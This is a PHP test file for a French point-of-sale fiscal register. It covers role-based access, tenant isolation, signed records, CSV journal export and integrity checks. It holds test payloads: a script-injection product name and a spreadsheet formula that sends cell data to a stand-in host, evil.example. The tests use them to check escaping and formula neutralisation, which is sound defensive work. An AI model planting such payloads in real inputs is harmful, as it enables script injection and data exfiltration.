<?php

namespace Tests\Feature\Filament;

use App\Domain\Authorization\PermissionRegistry;
use App\Domain\CaisseSecurisee\Actions\ExporterJournalDesEvenementsAction;
use App\Domain\CaisseSecurisee\Enums\ChaineFiscale;
use App\Domain\CaisseSecurisee\Enums\CodeEvenement;
use App\Domain\CaisseSecurisee\Models\EnregistrementFiscal;
use App\Domain\CaisseSecurisee\Services\RegistreFiscal;
use App\Domain\Catalogue\Models\Produit;
use App\Domain\Contacts\Models\Client;
use App\Domain\Facturation\Actions\CloturerCaisseAction;
use App\Domain\Facturation\Actions\EnregistrerAvoirAction;
use App\Domain\Facturation\Enums\ModePaiement;
use App\Domain\Facturation\Models\Paiement;
use App\Domain\Tenancy\Enums\RoleMagasin;
use App\Domain\Tenancy\Models\Magasin;
use App\Domain\Tenancy\Services\TenantContext;
use App\Filament\App\Resources\EnregistrementFiscalResource;
use App\Filament\App\Resources\EnregistrementFiscalResource\Pages\ListEnregistrementsFiscaux;
use App\Filament\App\Resources\EnregistrementFiscalResource\Pages\ViewEnregistrementFiscal;
use App\Filament\App\Resources\EnregistrementFiscalResource\Widgets\ConformiteApercu;
use App\Models\User;
use Carbon\CarbonImmutable;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\DB;
use Livewire\Features\SupportTesting\Testable;
use Livewire\Livewire;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * La caisse sécurisée du panneau : le registre fiscal du magasin, en
 * lecture seule, son widget de conformité et l'export CSV de son journal
 * des événements.
 */
class EnregistrementFiscalResourceTest extends TestCase
{
    use RefreshDatabase;

    private function magasinDe(User $proprietaire, string $nom = 'Ma Boutique'): Magasin
    {
        return $this->ouvrirUneSociete(['nom' => $nom], $proprietaire);
    }

    private function connecterProprietaire(): Magasin
    {
        $proprietaire = User::factory()->create();
        $magasin = $this->magasinDe($proprietaire);
        $this->actingAs($proprietaire);
        Filament::setTenant($magasin);

        return $magasin;
    }

    private function journaliser(CodeEvenement $code, array $details = []): EnregistrementFiscal
    {
        return DB::transaction(fn (): EnregistrementFiscal => app(RegistreFiscal::class)->journaliser($code, $details));
    }

    /**
     * Une vente au comptoir du responsable de test du magasin actif : le
     * propriétaire connecté consulte le registre, mais ne vend jamais.
     */
    private function vendre(int $quantite = 2): void
    {
        $produit = Produit::factory()->create(['nom' => 'Article à 12 €', 'prix_vente_ttc' => 12, 'taux_tva' => 20, 'suivi_stock' => false]);

        self::vendreAuComptant($this->responsableDeTest(app(TenantContext::class)->magasin()), Client::factory()->create(), [['produit_id' => $produit->id, 'quantite' => $quantite]], ModePaiement::Especes);
    }

    /**
     * @return list<string>
     */
    private function types(): array
    {
        return EnregistrementFiscal::query()->orderBy('id')->get()
            ->map(fn (EnregistrementFiscal $enregistrement): string => "{$enregistrement->chaine->value}:{$enregistrement->type}")
            ->all();
    }

    /**
     * Le fichier téléchargé par l'action, lu comme un tableur le lit.
     *
     * @return list<list<string>>
     */
    private function lignesDuCsv(Testable $composant): array
    {
        $contenu = base64_decode($composant->effects['download']['content']);
        $this->assertStringStartsWith("\u{FEFF}", $contenu);
        $flux = fopen('php://memory', 'r+b');
        fwrite($flux, substr($contenu, 3));
        rewind($flux);
        $lignes = [];

        while (($ligne = fgetcsv($flux, null, ';', '"', '')) !== false) {
            $lignes[] = $ligne;
        }

        return $lignes;
    }

    /**
     * @return array<string, array{0: RoleMagasin, 1: list<string>}>
     */
    public static function rolesQuiConsultent(): array
    {
        return [
            'vendeur aux cases de l\'administrateur' => [RoleMagasin::Vendeur, PermissionRegistry::modeleDeLAdministrateur()],
            'vendeur aux cases de l\'ancien comptable' => [RoleMagasin::Vendeur, self::casesDeLAncienComptable()],
        ];
    }

    #[DataProvider('rolesQuiConsultent')]
    public function test_ce_membre_consulte_la_caisse_securisee(RoleMagasin $role, ?array $autorisations): void
    {
        $magasin = $this->magasinDe(User::factory()->create());
        $membre = $this->membre($magasin, $role, $autorisations, ['name' => 'Camille', 'email' => 'camille@example.test']);

        $reponse = $this->actingAs($membre)->get(EnregistrementFiscalResource::getUrl('index', ['tenant' => $magasin]));

        $reponse->assertSee('130 – Modification des droits d\'un utilisateur');
    }

    public function test_un_vendeur_n_ouvre_pas_la_caisse_securisee(): void
    {
        $magasin = $this->magasinDe(User::factory()->create());
        $vendeur = $this->membre($magasin, RoleMagasin::Vendeur, null, ['name' => 'Paul', 'email' => 'paul@example.test']);

        $reponse = $this->actingAs($vendeur)->get(EnregistrementFiscalResource::getUrl('index', ['tenant' => $magasin]));

        $reponse->assertForbidden();
    }

    public function test_le_proprietaire_voit_le_registre_de_son_magasin_et_pas_celui_d_un_autre(): void
    {
        $this->magasinDe(User::factory()->create(), 'Autre boutique');
        $evenementDeLAutre = $this->journaliser(CodeEvenement::ExportDeDonnees);
        $this->connecterProprietaire();
        $this->vendre();
        $enregistrements = EnregistrementFiscal::query()->get();

        $composant = Livewire::test(ListEnregistrementsFiscaux::class);

        $composant->assertCanSeeTableRecords($enregistrements)
            ->assertCanNotSeeTableRecords([$evenementDeLAutre])
            ->assertCountTableRecords(3)
            ->assertSee('260 – Initialisation du registre fiscal du magasin')
            ->assertSee('Paiement')
            ->assertSee('Ticket');
    }

    public function test_la_caisse_securisee_ne_se_cree_ne_se_modifie_ni_ne_se_supprime(): void
    {
        $magasin = $this->connecterProprietaire();
        $evenement = $this->journaliser(CodeEvenement::ExportDeDonnees);

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->assertActionDoesNotExist('create')
            ->assertTableActionExists('view')
            ->assertTableActionDoesNotExist('edit')
            ->assertTableActionDoesNotExist('delete')
            ->assertTableBulkActionDoesNotExist('delete');
        Livewire::test(ViewEnregistrementFiscal::class, ['record' => $evenement->getRouteKey()])
            ->assertActionDoesNotExist('edit')
            ->assertActionDoesNotExist('delete');
        $this->get(EnregistrementFiscalResource::getUrl('index', ['tenant' => $magasin])."/{$evenement->getRouteKey()}/edit")
            ->assertNotFound();
    }

    public function test_la_fiche_montre_le_contenu_signe_mis_en_forme_et_echappe(): void
    {
        $this->connecterProprietaire();
        $produit = Produit::factory()->create(['nom' => '<script>alert("vol")</script>', 'taux_tva' => 5.5]);
        $produit->update(['taux_tva' => 20]);
        $evenement = EnregistrementFiscal::query()->where('type', '270')->sole();

        $composant = Livewire::test(ViewEnregistrementFiscal::class, ['record' => $evenement->getRouteKey()]);

        $composant->assertSee('270 – Modification d\'un paramètre ayant un impact sur la conformité')
            ->assertSee('"parametre": "taux_tva"')
            ->assertSee('"ancienne_valeur": "5.50"')
            ->assertSee('"nouvelle_valeur": "20.00"')
            ->assertSee('Produit (identifiant interne '.$produit->id.')')
            ->assertSee($evenement->signature)
            ->assertSee('&lt;script&gt;alert(', false)
            ->assertDontSee('<script>alert(', false);
    }

    /**
     * Un ticket n'est pas « facture n° {id} » : la colonne Document donne
     * le numéro légal d'une vente, et l'identifiant interne, nommé comme
     * tel, de ce qui n'en a pas.
     */
    public function test_la_colonne_document_donne_le_numero_legal_d_une_vente_et_l_identifiant_interne_du_reste(): void
    {
        $this->connecterProprietaire();
        $produit = Produit::factory()->create(['prix_vente_ttc' => 12, 'taux_tva' => 20, 'suivi_stock' => false]);
        $ticket = self::vendreAuComptant($this->responsableDeTest(app(TenantContext::class)->magasin()), Client::factory()->create(), [['produit_id' => $produit->id, 'quantite' => 1]], ModePaiement::Especes);
        $paiement = Paiement::query()->sole();

        $composant = Livewire::test(ListEnregistrementsFiscaux::class);

        $composant->assertSee("Ticket {$ticket->numero}")
            ->assertSee("Paiement (identifiant interne {$paiement->id})")
            ->assertDontSee("facture n° {$ticket->id}");
    }

    /**
     * Point 21 : la clôture du jour paraît dans la caisse sécurisée, son
     * événement nommé par le numéro de son ticket Z, jamais par un
     * identifiant interne.
     */
    public function test_l_evenement_de_cloture_nomme_son_ticket_z(): void
    {
        $this->travelTo('2026-10-09 10:00:00');
        $magasin = $this->connecterProprietaire();
        $cloture = app(CloturerCaisseAction::class)->handle(self::auteur(), $magasin, now());

        $composant = Livewire::test(ListEnregistrementsFiscaux::class);

        $composant->assertSee('50 – Clôture de période (journée)')
            ->assertSee("Clôture {$cloture->numero}")
            ->assertDontSee("(identifiant interne {$cloture->id})");
    }

    /**
     * La signature d'une vente se vérifie hors de l'application avec le
     * texte exact que la fiche donne, que l'export du journal des
     * événements ne reprend pas.
     */
    public function test_la_fiche_d_une_vente_donne_le_texte_exact_qu_elle_signe(): void
    {
        $this->connecterProprietaire();
        $this->vendre();
        $vente = EnregistrementFiscal::query()->where('chaine', ChaineFiscale::Vente->value)->sole();

        $composant = Livewire::test(ViewEnregistrementFiscal::class, ['record' => $vente->getRouteKey()]);

        $composant->assertSee('Texte exact signé')
            ->assertSee($vente->contenu);
    }

    public function test_les_horodatages_s_affichent_a_l_heure_de_paris(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 08:15:30', 'UTC'));
        $this->connecterProprietaire();
        $evenement = $this->journaliser(CodeEvenement::ExportDeDonnees);

        Livewire::test(ViewEnregistrementFiscal::class, ['record' => $evenement->getRouteKey()])
            ->assertSee('20/10/2026 à 10:15:30');
    }

    public function test_le_filtre_par_chaine_ne_garde_que_ses_enregistrements(): void
    {
        $this->connecterProprietaire();
        $this->vendre();
        $ventes = EnregistrementFiscal::query()->where('chaine', ChaineFiscale::Vente->value)->get();
        $autres = EnregistrementFiscal::query()->where('chaine', '!=', ChaineFiscale::Vente->value)->get();

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->filterTable('chaine', ChaineFiscale::Vente->value)
            ->assertCanSeeTableRecords($ventes)
            ->assertCanNotSeeTableRecords($autres);
    }

    public function test_le_filtre_par_code_ne_garde_que_les_evenements_de_ce_code(): void
    {
        $this->connecterProprietaire();
        $export = $this->journaliser(CodeEvenement::ExportDeDonnees);
        $this->vendre();
        $autres = EnregistrementFiscal::query()->whereKeyNot($export->id)->get();

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->filterTable('code', CodeEvenement::ExportDeDonnees->value)
            ->assertCanSeeTableRecords([$export])
            ->assertCanNotSeeTableRecords($autres);
    }

    /**
     * Un jour de la période va de minuit à minuit à Paris : à 23 h 30 le
     * 20 octobre à Paris, il est 21 h 30 UTC le 20 ; à 0 h 30 le 21 à
     * Paris, il est encore le 20 en UTC (22 h 30).
     */
    public function test_le_filtre_par_periode_compte_les_jours_a_l_heure_de_paris(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 23:30:00', 'Europe/Paris'));
        $this->connecterProprietaire();
        $leVingt = $this->journaliser(CodeEvenement::ExportDeDonnees);
        $this->travelTo(CarbonImmutable::parse('2026-10-21 00:30:00', 'Europe/Paris'));
        $leVingtEtUn = $this->journaliser(CodeEvenement::ExportDeDonnees);
        $initialisation = EnregistrementFiscal::query()->where('type', '260')->sole();

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->filterTable('periode', ['du' => '2026-10-21', 'au' => '2026-10-21'])
            ->assertCanSeeTableRecords([$leVingtEtUn])
            ->assertCanNotSeeTableRecords([$leVingt, $initialisation]);
    }

    public function test_l_export_csv_du_journal_contient_les_colonnes_attendues_et_s_inscrit_au_journal(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
        $this->connecterProprietaire();
        $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']);
        $this->vendre();
        $this->travelTo(CarbonImmutable::parse('2026-10-22 09:30:00', 'Europe/Paris'));

        $composant = Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-22']);

        $composant->assertFileDownloaded('journal-des-evenements-du-2026-10-20-au-2026-10-22.csv');
        $lignes = $this->lignesDuCsv($composant);
        $this->assertSame(ExporterJournalDesEvenementsAction::COLONNES, $lignes[0]);
        $this->assertSame(['1', '2', '3'], array_column(array_slice($lignes, 1), 0));
        $this->assertSame(['260', '270', '110'], array_column(array_slice($lignes, 1), 3));
        $export = EnregistrementFiscal::query()->where('type', '110')->sole();
        $this->assertSame(['export' => 'journal_des_evenements', 'format' => 'csv', 'du' => '2026-10-20', 'au' => '2026-10-22'], $export->contenuSigne()['donnees']['details']);
        $this->assertSame([
            '3',
            '22/10/2026 09:30:00',
            '20261022073000Z',
            '110',
            'Export de données',
            auth()->user()->name.' (n° '.auth()->id().')',
            '{"export":"journal_des_evenements","format":"csv","du":"2026-10-20","au":"2026-10-22"}',
            '127.0.0.1',
            'Symfony',
            '',
            EnregistrementFiscal::query()->where('type', '270')->sole()->signature,
            $export->signature,
            'ES256',
            $export->cle_id,
            '1.2',
            $export->contenu,
        ], $lignes[3]);
        $clePublique = Arr::first(config('caisse_securisee.cles_publiques'));
        $this->assertSame(1, openssl_verify($lignes[3][15], base64_decode(strtr($lignes[3][11], '-_', '+/')), $clePublique, OPENSSL_ALGO_SHA256));
    }

    /**
     * Le nom de l'opérateur et son navigateur, lu dans la trace de
     * l'événement, viennent de l'utilisateur : un tableur ne les évalue pas
     * comme des formules à l'ouverture du fichier. Le contenu signé, lui,
     * reste exact pour la vérification, et le navigateur n'y est pas (S13).
     */
    public function test_l_export_csv_ne_laisse_aucune_formule_venue_de_l_utilisateur(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
        $proprietaire = User::factory()->create(['name' => '@SOMME(A1:A9)']);
        $magasin = $this->magasinDe($proprietaire);
        $navigateur = '=HYPERLINK("https://evil.example/?d="&A1;"Cliquez")';
        $this->actingAs($proprietaire)->withHeader('User-Agent', $navigateur)->get("/app/{$magasin->uuid}")->assertSuccessful();
        Filament::setTenant($magasin);

        $composant = Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-20']);

        $ouverture = $this->lignesDuCsv($composant)[2];
        $this->assertSame('80', $ouverture[3]);
        $this->assertSame("'@SOMME(A1:A9) (n° {$proprietaire->id})", $ouverture[5]);
        $this->assertSame("'{$navigateur}", $ouverture[8]);
        $this->assertSame(EnregistrementFiscal::query()->where('type', '80')->sole()->contenu, $ouverture[15]);
        $this->assertStringNotContainsString('HYPERLINK', $ouverture[15]);
    }

    /**
     * V1-7 : la trace d'un événement (adresse IP et navigateur) ne se lit
     * que par le propriétaire. Un membre aux cases de l'ancien comptable de
     * magasin, qui consulte la caisse sécurisée et exporte son journal,
     * voit l'événement et son contenu signé, et laisse vides les deux
     * colonnes de la trace dans l'export ; un expert-comptable voit
     * l'événement sans sa trace.
     */
    public function test_seul_le_proprietaire_lit_l_adresse_ip_et_le_navigateur_d_un_evenement(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
        $proprietaire = User::factory()->create();
        $magasin = $this->magasinDe($proprietaire);
        $comptable = $this->membre($magasin, RoleMagasin::Vendeur, self::casesDeLAncienComptable(), ['name' => 'Camille', 'email' => 'camille@example.test']);
        $this->actingAs($proprietaire)->withHeader('User-Agent', 'Navigateur du propriétaire')->get("/app/{$magasin->uuid}")->assertSuccessful();
        Filament::setTenant($magasin);
        $ouverture = EnregistrementFiscal::query()->where('type', '80')->sole();

        $vueDuProprietaire = Livewire::actingAs($proprietaire)->test(ViewEnregistrementFiscal::class, ['record' => $ouverture->getRouteKey()]);
        $vueDuComptable = Livewire::actingAs($comptable)->test(ViewEnregistrementFiscal::class, ['record' => $ouverture->getRouteKey()]);
        $exportDuComptable = Livewire::actingAs($comptable)->test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-20']);

        $vueDuProprietaire->assertSee('Trace technique')->assertSee('Navigateur du propriétaire');
        $vueDuComptable->assertSee('80 – Ouverture de session dans le magasin')->assertDontSee('Trace technique')->assertDontSee('Navigateur du propriétaire');
        $lignes = array_slice($this->lignesDuCsv($exportDuComptable), 1);
        $this->assertSame(['260', '130', '80', '110'], array_column($lignes, 3));
        $this->assertSame([['', ''], ['', ''], ['', ''], ['', '']], array_map(static fn (array $ligne): array => [$ligne[7], $ligne[8]], $lignes));
        $this->assertDatabaseCount('traces_evenements', 2);
        Livewire::actingAs($this->expertComptable($magasin))->test(ViewEnregistrementFiscal::class, ['record' => $ouverture->getRouteKey()])
            ->assertSee('80 – Ouverture de session dans le magasin')->assertDontSee('Trace technique')->assertDontSee('Navigateur du propriétaire');
    }

    /**
     * La fiche annonce la durée de conservation des traces réglée (Q4),
     * ici 6 mois, et non une durée écrite en dur.
     */
    public function test_la_fiche_annonce_la_duree_de_conservation_reglee_des_traces(): void
    {
        config(['conservation.traces_en_mois' => 6]);
        $proprietaire = User::factory()->create();
        $magasin = $this->magasinDe($proprietaire);
        $this->actingAs($proprietaire)->get("/app/{$magasin->uuid}")->assertSuccessful();
        Filament::setTenant($magasin);
        $ouverture = EnregistrementFiscal::query()->where('type', '80')->sole();

        Livewire::test(ViewEnregistrementFiscal::class, ['record' => $ouverture->getRouteKey()])
            ->assertSee('Hors du contenu signé, effacée 6 mois après l\'événement.');
    }

    /**
     * Deux magasins de la même société tiennent chacun leur journal :
     * l'export de Lyon ne contient que les événements de Lyon, jamais un
     * de Villeurbanne, même pour le propriétaire des deux.
     */
    public function test_l_export_du_journal_ne_contient_aucun_evenement_d_un_autre_magasin_de_la_societe(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
        $lyon = $this->connecterProprietaire();
        $villeurbanne = $this->ouvrirUnAutreMagasin($lyon, ['nom' => 'Villeurbanne']);
        app(TenantContext::class)->runAs($villeurbanne, fn () => $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']));
        app(TenantContext::class)->set($lyon);
        Filament::setTenant($lyon);
        $this->journaliser(CodeEvenement::ExportDeDonnees);

        $composant = Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-20']);

        $lignes = array_slice($this->lignesDuCsv($composant), 1);
        $this->assertSame(EnregistrementFiscal::query()->where('chaine', ChaineFiscale::Evenement->value)->orderBy('sequence')->pluck('signature')->all(), array_column($lignes, 11));
        foreach ($lignes as $ligne) {
            $this->assertSame($lyon->uuid, json_decode($ligne[15], true, flags: JSON_THROW_ON_ERROR)['magasin']['uuid']);
        }
        $this->assertTrue(app(TenantContext::class)->runAs($villeurbanne, fn (): bool => EnregistrementFiscal::query()->where('type', '270')->exists()));
    }

    public function test_l_export_ne_reprend_que_les_evenements_de_la_periode(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
        $this->connecterProprietaire();
        $this->journaliser(CodeEvenement::ExportDeDonnees);
        $this->travelTo(CarbonImmutable::parse('2026-10-21 10:00:00', 'Europe/Paris'));
        $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']);
        $this->travelTo(CarbonImmutable::parse('2026-10-22 10:00:00', 'Europe/Paris'));

        $composant = Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-21', 'au' => '2026-10-21']);

        $this->assertSame(['270'], array_column(array_slice($this->lignesDuCsv($composant), 1), 3));
    }

    public function test_une_periode_qui_finit_avant_de_commencer_est_refusee(): void
    {
        $this->connecterProprietaire();

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-09', 'au' => '2026-10-08'])
            ->assertHasActionErrors(['au' => 'after_or_equal'])
            ->assertNoFileDownloaded();

        $this->assertSame([], $this->types());
    }

    public function test_sans_cle_de_signature_l_export_est_refuse_et_l_ecran_dit_pourquoi(): void
    {
        $this->connecterProprietaire();
        config(['caisse_securisee.cle_privee' => null]);
        $this->app->forgetInstance(RegistreFiscal::class);

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('exporter_journal', ['du' => '2026-10-01', 'au' => '2026-10-09'])
            ->assertNotified('Caisse sécurisée non configurée : la clé privée de signature (CAISSE_SECURISEE_CLE_PRIVEE) est absente.')
            ->assertNoFileDownloaded();

        $this->assertSame([], $this->types());
    }

    public function test_verifier_l_integrite_depuis_l_ecran_inscrit_le_controle_et_le_dit(): void
    {
        $this->connecterProprietaire();
        $this->vendre();

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('verifier_integrite', ['complet' => true])
            ->assertNotified('Intégrité vérifiée : aucune anomalie');

        $controle = EnregistrementFiscal::query()->where('type', '280')->sole();
        $this->assertSame(auth()->id(), $controle->operateur_id);
        $this->assertSame(
            ['verification' => 'complete', 'declenchement' => 'ecran', 'resultat' => 'conforme'],
            Arr::only($controle->contenuSigne()['donnees']['details'], ['verification', 'declenchement', 'resultat']),
        );
    }

    public function test_l_ecran_affiche_les_anomalies_relevees_par_la_verification(): void
    {
        $magasin = $this->connecterProprietaire();
        $this->vendre();
        DB::table('sequences_documents')->where('magasin_id', $magasin->id)->where('type_document', 'ticket_caisse')->update(['prochain_numero' => 3]);

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('verifier_integrite', ['complet' => true])
            ->assertNotified('Intégrité : 1 anomalie(s) relevée(s)');

        $this->assertSame(['95', '280'], EnregistrementFiscal::query()->whereIn('type', ['90', '95', '280'])->orderBy('id')->pluck('type')->all());
    }

    public function test_sans_cle_de_signature_la_verification_est_refusee_et_l_ecran_dit_pourquoi(): void
    {
        $this->connecterProprietaire();
        config(['caisse_securisee.cle_privee' => null]);
        $this->app->forgetInstance(RegistreFiscal::class);

        Livewire::test(ListEnregistrementsFiscaux::class)
            ->callAction('verifier_integrite', ['complet' => false])
            ->assertNotified('Caisse sécurisée non configurée : la clé privée de signature (CAISSE_SECURISEE_CLE_PRIVEE) est absente.');

        $this->assertSame(0, EnregistrementFiscal::query()->where('type', '280')->count());
    }

    public function test_le_widget_conformite_montre_la_derniere_verification(): void
    {
        $this->travelTo(CarbonImmutable::parse('2026-10-20 03:00:00', 'Europe/Paris'));
        $this->connecterProprietaire();
        Livewire::test(ConformiteApercu::class)->assertSee('Jamais');

        Livewire::test(ListEnregistrementsFiscaux::class)->callAction('verifier_integrite', ['complet' => true]);

        Livewire::test(ConformiteApercu::class)
            ->assertSeeInOrder(['Dernière vérification', 'Conforme', 'Vérification complète du 20/10/2026 à 03:00:00']);
    }

    public function test_le_widget_conformite_montre_la_version_la_cle_et_les_grands_totaux_de_la_derniere_vente(): void
    {
        $this->connecterProprietaire();
        $client = Client::factory()->create();
        $produit = Produit::factory()->create(['prix_vente_ttc' => 12, 'taux_tva' => 20, 'suivi_stock' => false]);
        $ticket = self::vendreAuComptant($this->responsableDeTest(app(TenantContext::class)->magasin()), $client, [['produit_id' => $produit->id, 'quantite' => 2]], ModePaiement::Especes);
        app(EnregistrerAvoirAction::class)->handle(self::auteur(), $client, [['ligne_facture_id' => $ticket->lignes->sole()->id, 'quantite' => 1]], 'Retour');
        $clePublique = Arr::first(config('caisse_securisee.cles_publiques'));
        $cleId = hash('sha256', base64_decode(str_replace(['-----BEGIN PUBLIC KEY-----', '-----END PUBLIC KEY-----', "\n"], '', $clePublique)));

        Livewire::test(ConformiteApercu::class)
            ->assertSee('Version 1.2')
            ->assertSee('Article 286, I, 3° bis du code général des impôts')
            ->assertSee('Empreinte SHA-256 : '.$cleId)
            ->assertSeeInOrder(['Grand total perpétuel réel', '12,00 €', 'Grand total perpétuel absolu', '36,00 €'])
            ->assertSee('Signé par la vente n° 2');
    }

    public function test_sans_cle_de_signature_le_widget_le_dit(): void
    {
        $this->connecterProprietaire();
        config(['caisse_securisee.cle_privee' => null]);

        Livewire::test(ConformiteApercu::class)
            ->assertSee('Non configurée')
            ->assertSee('Aucune vente enregistrée');
    }
}
